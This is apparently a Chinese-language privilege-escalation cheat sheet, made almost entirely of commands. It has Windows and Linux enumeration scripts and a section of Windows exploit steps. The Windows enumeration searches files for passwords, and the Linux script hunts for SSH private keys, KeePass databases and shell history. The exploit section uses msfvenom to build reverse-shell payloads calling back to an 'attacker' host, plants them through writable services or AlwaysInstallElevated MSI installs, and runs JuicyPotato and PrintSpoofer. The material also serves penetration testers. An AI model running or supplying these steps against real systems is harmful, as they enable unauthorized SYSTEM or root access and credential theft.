#### Windows提权检查脚本

```bash
# Windows提权信息收集清单

# 系统信息
systeminfo
wmic qfe list                              # 补丁列表
wmic os get osarchitecture                 # 系统架构
echo %PATH%                                # 环境变量

# 用户信息
whoami /all                                # 当前用户权限
net user                                    # 用户列表
net localgroup Administrators               # 管理员列表
net accounts                                # 账户策略

# 服务配置
wmic service list brief                    # 服务列表
wmic service get name,displayname,pathname,startmode # 服务路径
accesschk.exe -uwcqv "Authenticated Users" * # 可写服务
sc qc <service_name>                       # 服务配置

# 注册表检查
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer # AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall # 已安装软件

# 文件系统检查
dir /a C:\Users\                           # 用户目录
dir /a C:\ProgramData\                     # 程序数据
icacls C:\Windows\System32\                 # 文件权限
findstr /SI /M "password" *.txt *.ini *.cfg # 密码搜索

# 网络信息
ipconfig /all                              # 网络配置
route print                                # 路由表
netstat -ano                               # 网络连接
arp -a                                     # ARP缓存

# 计划任务
schtasks /query /fo LIST /v               # 计划任务列表

# 自动运行
wmic startup get caption,command          # 启动项
```

#### 常见提权漏洞利用

```bash
# 1. 可写服务路径提权
# 当服务可执行文件路径可写时，替换为恶意程序

# 检查服务路径权限
sc qc <service>
icacls "C:\path\to\service.exe"

# 生成恶意程序
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe -o service.exe

# 替换并重启服务
copy service.exe "C:\path\to\service.exe"
sc stop <service>
sc start <service>

# 2. 未引用服务路径提权
# 服务路径含空格且未引用时，创建路径劫持文件
# 例如: C:\Program Files\My Service\service.exe
# 创建 C:\Program.exe

# 3. AlwaysInstallElevated提权
# 当注册表设置了AlwaysInstallElevated=1时
# MSI文件以SYSTEM权限安装

msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o exploit.msi
msiexec /quiet /qn /i exploit.msi

# 4. JuicyPotato提权 (Windows 2012-2016)
# 需要SeImpersonate权限
JuicyPotato.exe -l 1337 -p c:\inetpub\wwwroot\shell.exe -t * -c {CLSID}

# 5. PrintSpoofer提权 (Windows 2019/2022)
# 需要SeImpersonate权限
PrintSpoofer.exe -i -c "c:\shell.exe"
```

#### Linux提权检查脚本

```bash
#!/bin/bash
# Linux提权信息收集脚本

echo "=== 系统信息 ==="
uname -a
cat /etc/os-release
cat /etc/issue
hostname

echo "=== 用户信息 ==="
id
whoami
sudo -l
cat /etc/passwd | grep -v nologin | grep -v false

echo "=== 网络信息 ==="
ip addr
ip route
ss -tlnp
arp -a

echo "=== SUID文件 ==="
find / -perm -4000 -type f 2>/dev/null

echo "=== SGID文件 ==="
find / -perm -2000 -type f 2>/dev/null

echo "=== 可写文件 ==="
find / -writable -type d 2>/dev/null | head -20
find / -perm -2 -type f 2>/dev/null | head -20

echo "=== Cron任务 ==="
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
ls -la /var/spool/cron/

echo "=== 计划任务 ==="
cat /etc/anacrontab
systemctl list-timers

echo "=== 服务信息 ==="
systemctl list-units --type=service --state=running

echo "=== 敏感文件 ==="
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | head -20
find / -name "id_rsa" -o -name "id_dsa" 2>/dev/null
find / -name "*.kdbx" 2>/dev/null
cat ~/.bash_history 2>/dev/null | head -50

echo "=== Docker ==="
docker ps -a 2>/dev/null
docker images 2>/dev/null

echo "=== 环境变量 ==="
env
cat /etc/environment
cat ~/.bashrc
cat ~/.profile

echo "=== 已安装软件 ==="
dpkg -l 2>/dev/null | head -30
rpm -qa 2>/dev/null | head -30
pip list 2>/dev/null
```
